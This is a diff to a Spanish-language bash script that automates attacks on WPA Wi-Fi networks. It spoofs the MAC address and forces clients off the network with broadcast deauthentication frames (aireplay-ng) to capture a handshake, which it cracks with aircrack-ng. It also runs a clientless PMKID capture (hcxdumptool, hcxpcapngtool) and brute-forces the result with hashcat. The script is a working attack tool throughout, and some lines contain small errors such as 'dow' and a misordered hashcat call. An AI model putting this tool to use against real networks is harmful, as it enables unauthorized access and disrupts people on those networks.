@@ -27,11 +27,13 @@ function ctrl_c {
 
 # function help panel 
 function helpPanel {
+	clear
 	echo -e "\n${yellowColor}[*]${endColor}${greyColor} Uso: ./jaquiar.sh${endColor}\n"
 	echo -e "\t${purpleColor}a)${endColor}${yellowColor} Modo de ataques${endColor}"
 	echo -e "\t\t${redColor}Handshake${endColor}"
 	echo -e "\t\t${redColor}PKMID${endColor}"
 	echo -e "\t${purpleColor}n)${endColor}${yellowColor} Tarjeta de red${endColor}"
+	echo -e "\t${purpleColor}h)${endColor}${yellowColor} Mostrar panel de ayuda${endColor}"
 	exit 0
 }
 
@@ -67,32 +69,58 @@ function startAttack {
 	# dar de baja tarjeta de red
 	ifconfig ${network_card}mon dow && macchanger -a ${network_card}mon >& /dev/null
 	# dar de alta la nueva tarjeta de red
-	ifconfig ${network_card}mon up  
+	ifconfig ${network_card}mon up 
 	# manejar procesos conflictivos
 	killall dhclient wpa_supplicant 2> /dev/null
-
+		
 	echo -e "${yellowColor}[*]${endColor}${greyColor} Nueva dirección MAC asignada ${endColor}${purpleColor}[${endColor}${blueColor}$(macchanger -s ${network_card}mon | grep -i current | xargs | cut -d ' ' -f '3-10')${endColor}${purpleColor}]${endColor}"
 
-	# poner targeta en modo monitor
-	xterm -hold -e "airodump-ng ${network_card}mon" &
-	# captura del proceso ID *Tenga en cuenta que $! solo captura PID en segundo plano*
-	airodump_xterm_PID=$!
+	if [[ "$(echo $attack_mode)" == "Handshake" ]]; then
+		clear
+		# poner targeta en modo monitor
+		xterm -hold -e "airodump-ng ${network_card}mon" &
+		# captura del proceso ID *Tenga en cuenta que $! solo captura PID en segundo plano*
+		airodump_xterm_PID=$!
+		echo -ne "${yellowColor}[*]${endColor}${greyColor} Nombre del punto de acceso: ${endColor}" && read app_name
+		echo -ne "${yellowColor}[*]${endColor}${greyColor} Canal del punto de acceso: ${endColor}" && read app_chanel
+		
+                # matar proceso airodump
+		kill -9 $airodump_xterm_PID; wait $airodump_xterm_PID >& /dev/null
+		# filtrar
+		xterm -hold -e "airodump-ng -c $app_chanel -w Captura --essid $app_name ${network_card}mon" &
+		# recuperar proceso ID 
+		airodump_filter_xterm_PID=$!
+		
+		sleep 5; xterm -hold -e "aireplay-ng -0 10 -e $app_name -c FF:FF:FF:FF:FF:FF ${network_card}mon" &
+		arieplay_xterm_PID=$!
+		sleep 10; kill -9 $arieplay_xterm_PID; wait $arieplay_xterm_PID >& /dev/null
+		sleep 10; kill -9 $airodump_filter_xterm_PID; wait $airodump_filter_xterm_PID >& /dev/null
+		# Romper cifrado contraseña
+		xterm -hold -e "aircrack-ng -w /usr/share/OneListForAll/onelistforallmicro.txt Captura-01.cap" &
 
-	echo -ne "${yellowColor}[*]${endColor}${greyColor} Nombre del punto de acceso: ${endColor}" && read app_name
-	echo -ne "${yellowColor}[*]${endColor}${greyColor} Canal del punto de acceso: ${endColor}" && read app_chanel
-	# matar proceso airodump
-	sleep 10; kill -9 $airodump_xterm_PID; wait $airodump_xterm_PID >& /dev/null
-	# filtrar
-	xterm -hold -e "airodump-ng -c $app_chanel -w Captura --essid $app_name ${network_card}mon" &
-	# recuperar proceso ID 
-	airodump_filter_xterm_PID=$!
+	elif [[ "$(echo $attack_mode)" == "PKMID" ]]; then
+		clear
+		echo -ne "${yellowColor}[*]${endColor}${greyColor} Iniciando ClientLess PKMID attack... ${endColor}\n"
+		sleep 2
+		timeout 60 bash -c "hcxdumptool -i ${network_card}mon --enable_status=1 -c 8 -o Captura"
+		sleep 2
+		echo -ne "${yellowColor}[*]${endColor}${greyColor} Obteniendo Hashes... ${endColor}\n"
+		hcxpcapngtool -o myHashes Captura; rm Captura >& /dev/null
+		sleep 2
 
-	sleep 5; xterm -hold -e "aireplay-ng -0 10 -e $app_name -c FF:FF:FF:FF:FF:FF ${network_card}" &
-	arieplay_xterm_PID=$!
-	sleep 10; kill -9 $arieplay_xterm_PID; wait $arieplay_xterm_PID >& /dev/null
-	sleep 10; kill -9 $airodump_filter_xterm_PID; wait $airodump_filter_xterm_PID >& /dev/null
-	# Romper cifrado contraseña
-	xterm -hold -e "aircrack-ng -w /usr/share/wordlists/rockyou.txt Captura-01.cap" &
+		test -f myHashes
+		if [[ "$(echo $?)" == "0" ]]; then
+			echo -ne "${yellowColor}[*]${endColor}${greyColor} Iniciando proceso de fuerza bruta... ${endColor}\n"
+			hashcat -m 16800 /usr/share/OneListForAll/onelistforallmicro.txt myHashes -d 1 --force
+		else
+			echo -ne "${redColor}[!]${endColor}${greyColor} No se ha podido capturar ningún paquete... ${endColor}\n"
+		fi
+
+
+	else
+		echo -e "\n${redColor}[*]${endColor}${yellowColor} Opción no válida ${endColor}\n"
+	fi
+
 
 }
 
